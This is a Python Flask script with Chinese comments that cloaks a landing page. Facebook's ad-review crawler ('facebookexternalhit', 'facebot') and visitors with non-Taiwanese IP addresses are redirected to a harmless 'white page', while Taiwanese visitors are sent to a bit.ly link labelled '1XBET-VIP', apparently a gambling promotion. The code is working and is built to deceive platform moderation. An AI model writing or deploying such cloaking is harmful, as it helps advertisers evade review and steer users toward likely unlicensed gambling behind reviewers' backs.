from flask import Flask, request, redirect
import geoip2.database
import os

app = Flask(__name__)

# 讀取 GeoLite2 資料庫
reader = geoip2.database.Reader('./GeoLite2-Country.mmdb')

@app.route('/')
def index():
    user_agent = request.headers.get('User-Agent', '').lower()

    # 取真實訪客 IP：先看 X-Forwarded-For 再 fallback 回 remote_addr
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    query_string = request.query_string.decode()

    # 嘗試從 IP 判斷國家
    try:
        response = reader.country(ip_address)
        country_code = response.country.iso_code  # e.g. 'TW'
    except Exception as e:
        print(f"[GeoIP Error] IP: {ip_address}, Error: {e}")
        country_code = 'Unknown'

    # 印出偵測結果以便日後 debug
    print(f"[訪客資訊] IP: {ip_address}, 國碼: {country_code}, UA: {user_agent}")

    # 判斷是否為 Facebook 審核機器人
    is_facebook_crawler = (
        "facebookexternalhit" in user_agent or "facebot" in user_agent
    )

    # 條件判斷：如果是審核機器人 或 非台灣 IP -> 跳白頁
    if is_facebook_crawler or country_code != 'TW':
        return redirect("https://example.com/" + query_string, code=302)  # 測試用白頁
    else:
        return redirect("https://bit.ly/1XBET-VIP?" + query_string, code=302)

import os

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)





